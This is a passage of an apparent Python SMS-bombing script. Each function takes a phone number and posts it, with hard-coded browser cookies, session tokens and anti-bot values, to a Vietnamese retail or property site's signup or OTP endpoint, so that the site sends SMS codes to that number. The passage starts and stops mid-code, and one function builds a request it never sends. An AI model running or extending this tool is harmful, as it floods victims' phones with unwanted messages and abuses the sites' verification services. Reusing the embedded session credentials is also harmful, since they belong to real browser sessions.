        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    }

    data = {
        '_csrf': '',
        'clientId': '609168b9f8d5275ea1e262d6',
        'redirectUrl': 'https://tiniworld.com',
        'phone': sdt,
    }

    response = requests.post('https://prod-tini-id.nkidworks.com/auth/tinizen', cookies=cookies, headers=headers, data=data)

    print(response.text) #nó in ra cái html web ,tý nhớ khắc phục

def batdongsan(sdt):
    cookies = {
        'con.ses.id': 'c4ae632e-7435-41b9-80e5-6c0529832803',
        'con.unl.lat': '1722877200',
        'con.unl.sc': '1',
        '_cfuvid': 'IFFHfTYRJer2NvSP9Yw3Pg0378aZ4YoltK2wqtcmSY0-1722958421148-0.0.1.1-604800000',
        '_gid': 'GA1.3.436248298.1722958422',
        '_gat_UA-3729099-1': '1',
        '_hjSession_1708983': 'eyJpZCI6ImE0YTM4MjliLWJjMTItNGU4MS1iMzdiLTk5ZTM5NTU2ODY1OCIsImMiOjE3MjI5NTg0MjE3NTcsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=',
        '_hjHasCachedUserAttributes': 'true',
        '__gads': 'ID=2f3269875313167c:T=1722958422:RT=1722958422:S=ALNI_MYFnEm9DmvyJF5xo2u12rrQb7D0VQ',
        '__gpi': 'UID=00000eb70cdcbb59:T=1722958422:RT=1722958422:S=ALNI_MYEucpcZOjiFrEja9gY8Iju5B_cbQ',
        '__eoi': 'ID=49882f7ee589ff71:T=1722958422:RT=1722958422:S=AA-AfjYtUPzuM-xzQVhpytU1gnn0',
        '_tt_enable_cookie': '1',
        '_ttp': 'SiBamCT1Xt-G_CcofQzGGokzSwK',
        'cf_clearance': 'YSMZkgX1Mvfk4xATBo2Q18230mHTeI8srxZ.UpGmUGw-1722958423-1.0.1.1-GhW0g2GPl7upPrx1mbXj4512HWR_z2su98GsgF846ckT1TzMeshliy7s0gNN6jdskPEkkvbzm7lLM6D3ttt7Wg',
        '_clck': '11lfi1g%7C2%7Cfo3%7C0%7C1679',
        '_fbp': 'fb.2.1722958422699.809623152716878314',
        '_ga': 'GA1.3.1257097749.1722958421',
        '_hjSessionUser_1708983': 'eyJpZCI6IjJmNTJlNmE3LWI0MDMtNTg0MC04Yzc2LTU0MDRhOTEwOTQyOSIsImNyZWF0ZWQiOjE3MjI5NTg0MjE3NTcsImV4aXN0aW5nIjp0cnVlfQ==',
        '_clsk': '51h2p5%7C1722958424622%7C2%7C0%7Cp.clarity.ms%2Fcollect',
        'con.unl.usr.id': '%7B%22key%22%3A%22userId%22%2C%22value%22%3A%22e33631e5-a219-448f-b748-356dab16a8bf%22%2C%22expireDate%22%3A%222025-08-06T22%3A33%3A45.6665854Z%22%7D',
        'con.unl.cli.id': '%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%221c00b333-4035-4b63-9024-644e71302ec9%22%2C%22expireDate%22%3A%222025-08-06T22%3A33%3A45.6666203Z%22%7D',
        '__zi': '3000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLincmF_oW0L0roUVkVY2JmhJBvYw-iTE2TzhaR_rnaC9q3Gs.1',
        '_gcl_au': '1.1.1994344428.1722958426',
        'ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9': '%7B%22g%22%3A%22b50efcb2-7fe2-e535-3791-affa365e9afc%22%2C%22c%22%3A1722958433600%2C%22l%22%3A1722958433600%7D',
        '_ga_HTS298453C': 'GS1.1.1722958421.1.1.1722958440.41.0.0',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        # 'cookie': 'con.ses.id=c4ae632e-7435-41b9-80e5-6c0529832803; con.unl.lat=1722877200; con.unl.sc=1; _cfuvid=IFFHfTYRJer2NvSP9Yw3Pg0378aZ4YoltK2wqtcmSY0-1722958421148-0.0.1.1-604800000; _gid=GA1.3.436248298.1722958422; _gat_UA-3729099-1=1; _hjSession_1708983=eyJpZCI6ImE0YTM4MjliLWJjMTItNGU4MS1iMzdiLTk5ZTM5NTU2ODY1OCIsImMiOjE3MjI5NTg0MjE3NTcsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=; _hjHasCachedUserAttributes=true; __gads=ID=2f3269875313167c:T=1722958422:RT=1722958422:S=ALNI_MYFnEm9DmvyJF5xo2u12rrQb7D0VQ; __gpi=UID=00000eb70cdcbb59:T=1722958422:RT=1722958422:S=ALNI_MYEucpcZOjiFrEja9gY8Iju5B_cbQ; __eoi=ID=49882f7ee589ff71:T=1722958422:RT=1722958422:S=AA-AfjYtUPzuM-xzQVhpytU1gnn0; _tt_enable_cookie=1; _ttp=SiBamCT1Xt-G_CcofQzGGokzSwK; cf_clearance=YSMZkgX1Mvfk4xATBo2Q18230mHTeI8srxZ.UpGmUGw-1722958423-1.0.1.1-GhW0g2GPl7upPrx1mbXj4512HWR_z2su98GsgF846ckT1TzMeshliy7s0gNN6jdskPEkkvbzm7lLM6D3ttt7Wg; _clck=11lfi1g%7C2%7Cfo3%7C0%7C1679; _fbp=fb.2.1722958422699.809623152716878314; _ga=GA1.3.1257097749.1722958421; _hjSessionUser_1708983=eyJpZCI6IjJmNTJlNmE3LWI0MDMtNTg0MC04Yzc2LTU0MDRhOTEwOTQyOSIsImNyZWF0ZWQiOjE3MjI5NTg0MjE3NTcsImV4aXN0aW5nIjp0cnVlfQ==; _clsk=51h2p5%7C1722958424622%7C2%7C0%7Cp.clarity.ms%2Fcollect; con.unl.usr.id=%7B%22key%22%3A%22userId%22%2C%22value%22%3A%22e33631e5-a219-448f-b748-356dab16a8bf%22%2C%22expireDate%22%3A%222025-08-06T22%3A33%3A45.6665854Z%22%7D; con.unl.cli.id=%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%221c00b333-4035-4b63-9024-644e71302ec9%22%2C%22expireDate%22%3A%222025-08-06T22%3A33%3A45.6666203Z%22%7D; __zi=3000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLincmF_oW0L0roUVkVY2JmhJBvYw-iTE2TzhaR_rnaC9q3Gs.1; _gcl_au=1.1.1994344428.1722958426; ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9=%7B%22g%22%3A%22b50efcb2-7fe2-e535-3791-affa365e9afc%22%2C%22c%22%3A1722958433600%2C%22l%22%3A1722958433600%7D; _ga_HTS298453C=GS1.1.1722958421.1.1.1722958440.41.0.0',
        'priority': 'u=1, i',
        'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    }

    params = {
        'phoneNumber': sdt,
    }

    response = requests.get(
        'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
        params=params,
        cookies=cookies,
        headers=headers,
    )

    print(response.text)

def watson(sdt):
    cookies = {
        '_atrk_siteuid': 'g7plf53bvsoWnv86',
        'FPID': 'FPID2.2.4GHiERhl7ZuEo0h0vByJVaQDVExqiW%2Fweo%2BV1UWQZUk%3D.1722958585',
        '_tt_enable_cookie': '1',
        '_ttp': '0RxbzIhEAiVhFaaGf4EMCiYOZGo',
        'watsonvn__zc': '3.66b24301aa108700149f9843.21.0.0.0.',
        'watsonvn__zc_store': '{%22cv%22:null}',
        'dtCookiefazzbd66': 'v_4_srv_2_sn_39C5B31E840266D65CEADA1BDA2E27C4_perc_100000_ol_0_mul_1_app-3Aa156527b274862dd_0',
        'PIM-SESSION-ID': 'vctULxkYymhLhSeY',
        'RT': '"z=1&dm=watsons.vn&si=1qurfuoy45q&ss=m39ydwze&sl=0&tt=0"',
        'ak_bmsc': '65F2E90F712D00732F70A11E805191D7~000000000000000000000000000000~YAAQVp42F9vhxw2TAQAAasU3EBlMTJL+x0RvgZsYIt/RPictUWnfudfxpfbMbSXBDB0v0SNk5CC9K/GN1xFb3wH3aujiatlHFLjmXCp/kXKzexDRO++BcfgONhUNxMd90z0Z0hItw+QtfLrfOlbXfxYFaKz0PrunwbAQKG5SQXsCjqOKbXtOAdQpNpSMzOqEXrqKVdR35drk857qCZM7u0e/ACxAe4lDv68KjB50dGJfWUtU6wjPOxMhWdmJXX3gTE198U2hVsYC2pEBKNOk02/fYrpUNHuG5ICHaDFDUPIMnP3qDIYnseJvSW86YYYl47HDJpSmzIIdpbziNpiG05+xEFQ9PfcEG8rl3mvHOiJ9cxsaRupMUYXNXjiV0jbkxghOqtw+awoDSJoApif8eiOPFdb2C0wVds/uEHmr8BoHihUocJBIB68qU+N5W2IDemQf8Tv/7nELoa6RUp2n',
        'authorization': 'ccxb2kZCX6v1nmsAs1EDidLmpac',
        'token_type': 'guest',
        'ROUTE': '.api-99777f9bd-9d76l',
        '_gcl_au': '1.1.1496558310.1731143911',
        '__gtm_referrer': 'https%3A%2F%2Fwww.google.com%2F',
        '_clck': '1at6spm%7C2%7Cfqq%7C0%7C1679',
        '_ga': 'GA1.2.1690053153.1722958585',
        '_gid': 'GA1.2.380905680.1731143912',
        '_fbp': 'fb.1.1731143911964.202563786777474446',
        'FPLC': 'TQ7UxUzcZgYWebHhp2shgOh82gb940Dszqian5f5td7TbUNq2cZsX3SJ5%2Bqwx6gndPkP1lHJLVFggrS3RDb1WPwcjMUzL47T81djWl13h7OaRgL950%2B7a5OC4ugZIw%3D%3D',
        'FPGSID': '1.1731143913.1731143913.G-QGNG2M3ENK.iG3rJ0NFyyLyFKSFpZKx3w',
        'OptanonConsent': 'isGpcEnabled=0&datestamp=Sat+Nov+09+2024+16%3A18%3A33+GMT%2B0700+(Gi%E1%BB%9D+%C4%90%C3%B4ng+D%C6%B0%C6%A1ng)&version=202407.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=d6a28b3e-4b2e-46d9-8b61-e427b6994c6d&interactionCount=1&isAnonUser=1&landingPath=https%3A%2F%2Fwww.watsons.vn%2Fvi%2F&groups=C0001%3A1%2CC0003%3A1%2CC0009%3A1',
        '_ga_8GM9QX6LT0': 'GS1.1.1731143911.2.1.1731143918.0.0.0',
        '_clsk': '5tfnj2%7C1731143919529%7C3%7C1%7Ci.clarity.ms%2Fcollect',
        '_ga_QGNG2M3ENK': 'GS1.1.1731143911.2.1.1731143920.51.0.0',
        '_abck': 'DBE2E42DFCB7BE288853A0A5ACFFEC0A~0~YAAQlFJNG66m+gWTAQAAeTU5EAxQa7oRY9XXHAEVt8OyBBVQdunovdrgRDzeC7DjqySPSuc0irqsafBSGghfUXqMZeKw+ud6gpdfkFEyAfgwJ/u9j3BZRSpdjXQjAh3SBgmFSfIWBaQeosJkmYhnm6f/2OtAPbTFGcHt1fKu0dved5ZmJm1KBnQeaO6Ik/uurU69D2Q9OwCvwx95ZvWidLAtWNxxHZpbScQ0iAOx2uf+4qUGxGsnNI8ep9s2svTIP4P+sMW+ORZ/grY2lmoZg03hR20ggqCq42WAvnWVFTkk+jnz1MF8iDG4xG3pZwVsgHQ/zrtxrgWEU4WwO4+pe+UGemRb4kr3Zsijc6yc+owu+FS+x6rBZr52Vg1Sps81et/GMHecBDdVvN6+qaIN5Jp8Hug7MzhrXCQ4iAWqYG1Uks7jCZztsDJnO77lRSbiokevWd4WTKS3opEIgaa05n986ahQYli6V3+65it/Iyucizs4hUfXhE/8fBa1/vrH3A3K0C53KiYCaNLBJtnJWJaB5GD2ouYGYiy4aezfNzbg6UrhD/kTgXKxTgPUvmJWxDok7wlvJAG4u1uNY6tw75myeKexIQRQQ5G9~-1~-1~-1',
        'bm_sv': 'A03605667B00141A4563B465D9AFE392~YAAQlFJNG6+m+gWTAQAAeTU5EBnf1ODW8lJ4BA1X8hfR6OzTBi2rVV1LXWgtcZ6SZ5HR5cKbPoI27klSj8V+fELWAM8yFbs9rgKN7msoKU6Fmp+Jmf7B+A72BA8/nHzo7z9h1Hz0hyAvrWV4RlNioMB024xskhkwYQ0OkPnVWKtKGnpLctQRL6FxqhAiHPBoDfMhtU0YN68OmbgLW8V2k1i4mkdfJsgiPQ8ft0qn/2M0Im1HjVRYfGANM0+Z1ncn2Q==~1',
        'bm_sz': '1CB4B0804AD2F8F960369283B407797C~YAAQlFJNG7Cm+gWTAQAAeTU5EBlTrKA8+2lUnAZDLT2hEVANzcomRDFTV2OHoWEZEKsd6PbqBjVeGHUEtVDp6ftAdGLhV2Rit+jK02G+5VBm5MSzWte/ctqp//sKAuMijIKSHDQkmLYJUT3GLHI5jSrr390Fgve2c2r3APoZ186RDFqoxQpO2ggo5/l9B6ZkAEYoPMTPpp5bgzxvVjWOg1Q4I00Pd1/cvnIeni7Am9uS8HcT549IPJcOTM8jjsuWlFXn4Wz5nNxOIHtK8GrRxScpwdpnRmYto8Gtuzu8RkjXkFtJ8oi6Cp06xqMjrdPz2DVyJdlk3GXQAcmfV/VOs+fQwpPajZ3GmXFG1ZeINp8tH0R4rpLwLgUev+75/HjDUKoEmObii+ljDGaeluYp8TtqnYCD~3556146~4601137',
    }
    
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'authorization': 'bearer ccxb2kZCX6v1nmsAs1EDidLmpac',
        'cache-control': 'no-cache, no-store, must-revalidate, post-check=0, pre-check=0',
        'content-type': 'application/json',
        # 'cookie': '_atrk_siteuid=g7plf53bvsoWnv86; FPID=FPID2.2.4GHiERhl7ZuEo0h0vByJVaQDVExqiW%2Fweo%2BV1UWQZUk%3D.1722958585; _tt_enable_cookie=1; _ttp=0RxbzIhEAiVhFaaGf4EMCiYOZGo; watsonvn__zc=3.66b24301aa108700149f9843.21.0.0.0.; watsonvn__zc_store={%22cv%22:null}; dtCookiefazzbd66=v_4_srv_2_sn_39C5B31E840266D65CEADA1BDA2E27C4_perc_100000_ol_0_mul_1_app-3Aa156527b274862dd_0; PIM-SESSION-ID=vctULxkYymhLhSeY; RT="z=1&dm=watsons.vn&si=1qurfuoy45q&ss=m39ydwze&sl=0&tt=0"; ak_bmsc=65F2E90F712D00732F70A11E805191D7~000000000000000000000000000000~YAAQVp42F9vhxw2TAQAAasU3EBlMTJL+x0RvgZsYIt/RPictUWnfudfxpfbMbSXBDB0v0SNk5CC9K/GN1xFb3wH3aujiatlHFLjmXCp/kXKzexDRO++BcfgONhUNxMd90z0Z0hItw+QtfLrfOlbXfxYFaKz0PrunwbAQKG5SQXsCjqOKbXtOAdQpNpSMzOqEXrqKVdR35drk857qCZM7u0e/ACxAe4lDv68KjB50dGJfWUtU6wjPOxMhWdmJXX3gTE198U2hVsYC2pEBKNOk02/fYrpUNHuG5ICHaDFDUPIMnP3qDIYnseJvSW86YYYl47HDJpSmzIIdpbziNpiG05+xEFQ9PfcEG8rl3mvHOiJ9cxsaRupMUYXNXjiV0jbkxghOqtw+awoDSJoApif8eiOPFdb2C0wVds/uEHmr8BoHihUocJBIB68qU+N5W2IDemQf8Tv/7nELoa6RUp2n; authorization=ccxb2kZCX6v1nmsAs1EDidLmpac; token_type=guest; ROUTE=.api-99777f9bd-9d76l; _gcl_au=1.1.1496558310.1731143911; __gtm_referrer=https%3A%2F%2Fwww.google.com%2F; _clck=1at6spm%7C2%7Cfqq%7C0%7C1679; _ga=GA1.2.1690053153.1722958585; _gid=GA1.2.380905680.1731143912; _fbp=fb.1.1731143911964.202563786777474446; FPLC=TQ7UxUzcZgYWebHhp2shgOh82gb940Dszqian5f5td7TbUNq2cZsX3SJ5%2Bqwx6gndPkP1lHJLVFggrS3RDb1WPwcjMUzL47T81djWl13h7OaRgL950%2B7a5OC4ugZIw%3D%3D; FPGSID=1.1731143913.1731143913.G-QGNG2M3ENK.iG3rJ0NFyyLyFKSFpZKx3w; OptanonConsent=isGpcEnabled=0&datestamp=Sat+Nov+09+2024+16%3A18%3A33+GMT%2B0700+(Gi%E1%BB%9D+%C4%90%C3%B4ng+D%C6%B0%C6%A1ng)&version=202407.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=d6a28b3e-4b2e-46d9-8b61-e427b6994c6d&interactionCount=1&isAnonUser=1&landingPath=https%3A%2F%2Fwww.watsons.vn%2Fvi%2F&groups=C0001%3A1%2CC0003%3A1%2CC0009%3A1; _ga_8GM9QX6LT0=GS1.1.1731143911.2.1.1731143918.0.0.0; _clsk=5tfnj2%7C1731143919529%7C3%7C1%7Ci.clarity.ms%2Fcollect; _ga_QGNG2M3ENK=GS1.1.1731143911.2.1.1731143920.51.0.0; _abck=DBE2E42DFCB7BE288853A0A5ACFFEC0A~0~YAAQlFJNG66m+gWTAQAAeTU5EAxQa7oRY9XXHAEVt8OyBBVQdunovdrgRDzeC7DjqySPSuc0irqsafBSGghfUXqMZeKw+ud6gpdfkFEyAfgwJ/u9j3BZRSpdjXQjAh3SBgmFSfIWBaQeosJkmYhnm6f/2OtAPbTFGcHt1fKu0dved5ZmJm1KBnQeaO6Ik/uurU69D2Q9OwCvwx95ZvWidLAtWNxxHZpbScQ0iAOx2uf+4qUGxGsnNI8ep9s2svTIP4P+sMW+ORZ/grY2lmoZg03hR20ggqCq42WAvnWVFTkk+jnz1MF8iDG4xG3pZwVsgHQ/zrtxrgWEU4WwO4+pe+UGemRb4kr3Zsijc6yc+owu+FS+x6rBZr52Vg1Sps81et/GMHecBDdVvN6+qaIN5Jp8Hug7MzhrXCQ4iAWqYG1Uks7jCZztsDJnO77lRSbiokevWd4WTKS3opEIgaa05n986ahQYli6V3+65it/Iyucizs4hUfXhE/8fBa1/vrH3A3K0C53KiYCaNLBJtnJWJaB5GD2ouYGYiy4aezfNzbg6UrhD/kTgXKxTgPUvmJWxDok7wlvJAG4u1uNY6tw75myeKexIQRQQ5G9~-1~-1~-1; bm_sv=A03605667B00141A4563B465D9AFE392~YAAQlFJNG6+m+gWTAQAAeTU5EBnf1ODW8lJ4BA1X8hfR6OzTBi2rVV1LXWgtcZ6SZ5HR5cKbPoI27klSj8V+fELWAM8yFbs9rgKN7msoKU6Fmp+Jmf7B+A72BA8/nHzo7z9h1Hz0hyAvrWV4RlNioMB024xskhkwYQ0OkPnVWKtKGnpLctQRL6FxqhAiHPBoDfMhtU0YN68OmbgLW8V2k1i4mkdfJsgiPQ8ft0qn/2M0Im1HjVRYfGANM0+Z1ncn2Q==~1; bm_sz=1CB4B0804AD2F8F960369283B407797C~YAAQlFJNG7Cm+gWTAQAAeTU5EBlTrKA8+2lUnAZDLT2hEVANzcomRDFTV2OHoWEZEKsd6PbqBjVeGHUEtVDp6ftAdGLhV2Rit+jK02G+5VBm5MSzWte/ctqp//sKAuMijIKSHDQkmLYJUT3GLHI5jSrr390Fgve2c2r3APoZ186RDFqoxQpO2ggo5/l9B6ZkAEYoPMTPpp5bgzxvVjWOg1Q4I00Pd1/cvnIeni7Am9uS8HcT549IPJcOTM8jjsuWlFXn4Wz5nNxOIHtK8GrRxScpwdpnRmYto8Gtuzu8RkjXkFtJ8oi6Cp06xqMjrdPz2DVyJdlk3GXQAcmfV/VOs+fQwpPajZ3GmXFG1ZeINp8tH0R4rpLwLgUev+75/HjDUKoEmObii+ljDGaeluYp8TtqnYCD~3556146~4601137',
        'expires': '0',
        'if-modified-since': 'Sat, 09 Nov 2024 09:20:04 GMT',
        'origin': 'https://www.watsons.vn',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'queue-target': 'https://www.watsons.vn/vi/register',
        'queueit-target': 'https://www.watsons.vn/vi/register',
        'referer': 'https://www.watsons.vn/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'vary': '*',
    }
    
    params = {
        'formId': 'registrationOTPForm_Web3',
        'lang': 'vi',
        'curr': 'VND',
    }
    
    json_data = {
        'uid': '',
        'action': 'REGISTRATION',
        'countryCode': '84',
        'target': sdt,
        'type': 'SMS',
    }

def tgdd(sdt):
    cookies = {
        '_pk_id.7.8f7e': '326d232381c4a729.1722958962.',
        '_fbp': 'fb.1.1722958961823.308098634976051879',
        '_tt_enable_cookie': '1',
        '_ttp': '4yDRqAxr6an6S8gfVvVkT7m5hCu',
        '_ce.s': 'v~ac171b998ee573e007655ab9c1277d082ceebbef~lcw~1723887390748~lva~1723887326814~vpv~2~v11.cs~127806~v11.s~0918e020-5c7c-11ef-b041-4997219d4d73~v11.sla~1723887390781~v11.send~1723887390748~lcw~1723887390781',
        'TBMCookie_3209819802479625248': '693869001731144182HT6kukB1i8zYY8s0PEiXmUvHhyU=',
        '___utmvm': '###########',
        '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
        '_gcl_au': '1.1.1582772934.1731144183',
        '_pk_ref.7.8f7e': '%5B%22%22%2C%22%22%2C1731144186%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
        '_pk_ses.7.8f7e': '1',
        '__zi': '3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJdZNMg_wI01dKCTwi_P156DSzcgNudqGLrpaqDW.1',
        '_oauthCDP_WebTGDD': '2EICzzDZp6mafDUUPhcXbSxwjvY9BSbQJCartUHZBevFT7yce61iAL_GY3ovp48Ive4meHJ_0GjUi6CHGz7UHoFNy1Fe036uVs9rmg94SDIynW46h1xqLJAytqg47So3gQSr0Y3OeLrTY2QtrAluYPl2slyiut6YQVQni7kAmkt5OrPyKtWX2QiSEpYHrmg94nl39fnsn5a8mAa1OkcmjrUlScpXrmg94c4NJ40Yxbn118jj2HzgjjSgy9Xxh9se_5ggFngtr0J9',
        'DMX_Personal': '%7B%22UID%22%3A%220bfbd7b587246767c21d622810dee43d43a32a9c%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
        'mwgngxpv': '3',
        '.AspNetCore.Antiforgery.Pr58635MgNE': 'CfDJ8PqbgkggxhxIv0ea3fAwIkLNVh-odG0IaOcJaClbs5O20z1cFxFu-YI8I2L1dBkMCY2XBqPlV8eFYeBNOnge00Eygcv2XucDRoeZ8r3iH_qOWWT3yi3owBjGisEShxR-XNZ4xgGV6vA-K18bXEAqSUQ',
        '_gid': 'GA1.2.1194414438.1731144187',
        '_ga': 'GA1.1.108570151.1722958962',
        '_gat': '1',
        '_ga_TZK5WPYMMS': 'GS1.2.1731144187.2.0.1731144187.60.0.0',
        '_ga_TLRZMSX5ME': 'GS1.1.1731144182.4.1.1731144189.53.0.0',
        'SvID': 'beline2682|Zy8qA|Zy8p+',
    }
    
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': "_pk_id.7.8f7e=326d232381c4a729.1722958962.; _fbp=fb.1.1722958961823.308098634976051879; _tt_enable_cookie=1; _ttp=4yDRqAxr6an6S8gfVvVkT7m5hCu; _ce.s=v~ac171b998ee573e007655ab9c1277d082ceebbef~lcw~1723887390748~lva~1723887326814~vpv~2~v11.cs~127806~v11.s~0918e020-5c7c-11ef-b041-4997219d4d73~v11.sla~1723887390781~v11.send~1723887390748~lcw~1723887390781; TBMCookie_3209819802479625248=693869001731144182HT6kukB1i8zYY8s0PEiXmUvHhyU=; ___utmvm=###########; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; _gcl_au=1.1.1582772934.1731144183; _pk_ref.7.8f7e=%5B%22%22%2C%22%22%2C1731144186%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.7.8f7e=1; __zi=3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJdZNMg_wI01dKCTwi_P156DSzcgNudqGLrpaqDW.1; _oauthCDP_WebTGDD=2EICzzDZp6mafDUUPhcXbSxwjvY9BSbQJCartUHZBevFT7yce61iAL_GY3ovp48Ive4meHJ_0GjUi6CHGz7UHoFNy1Fe036uVs9rmg94SDIynW46h1xqLJAytqg47So3gQSr0Y3OeLrTY2QtrAluYPl2slyiut6YQVQni7kAmkt5OrPyKtWX2QiSEpYHrmg94nl39fnsn5a8mAa1OkcmjrUlScpXrmg94c4NJ40Yxbn118jj2HzgjjSgy9Xxh9se_5ggFngtr0J9; DMX_Personal=%7B%22UID%22%3A%220bfbd7b587246767c21d622810dee43d43a32a9c%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; mwgngxpv=3; .AspNetCore.Antiforgery.Pr58635MgNE=CfDJ8PqbgkggxhxIv0ea3fAwIkLNVh-odG0IaOcJaClbs5O20z1cFxFu-YI8I2L1dBkMCY2XBqPlV8eFYeBNOnge00Eygcv2XucDRoeZ8r3iH_qOWWT3yi3owBjGisEShxR-XNZ4xgGV6vA-K18bXEAqSUQ; _gid=GA1.2.1194414438.1731144187; _ga=GA1.1.108570151.1722958962; _gat=1; _ga_TZK5WPYMMS=GS1.2.1731144187.2.0.1731144187.60.0.0; _ga_TLRZMSX5ME=GS1.1.1731144182.4.1.1731144189.53.0.0; SvID=beline2682|Zy8qA|Zy8p+",
        'Origin': 'https://www.thegioididong.com',
        'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
